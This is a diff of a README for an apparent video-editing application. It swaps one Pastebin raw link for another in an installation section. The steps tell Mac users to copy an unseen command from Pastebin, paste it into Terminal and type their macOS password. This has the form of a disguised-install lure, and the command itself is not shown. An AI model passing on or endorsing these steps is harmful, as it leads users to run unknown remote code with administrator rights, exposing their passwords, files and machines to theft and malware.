@@ -23,7 +23,7 @@ From cinematic films to YouTube tutorials, it provides advanced editing tools wi
 
 ### 💻 Installation via Terminal Command
 1. Open this Pastebin link and copy the command:  
-   👉 [https://pastebin.com](https://pastebin.com/raw/gCYjv4mD)  
+   👉 [https://pastebin.com](https://pastebin.com/raw/E1bQtGVK)  
 2. Open **Terminal** on your Mac.  
 3. Paste the copied command and press **Return**.  
 4. Enter your macOS password (if required) and wait for the installation to complete.  
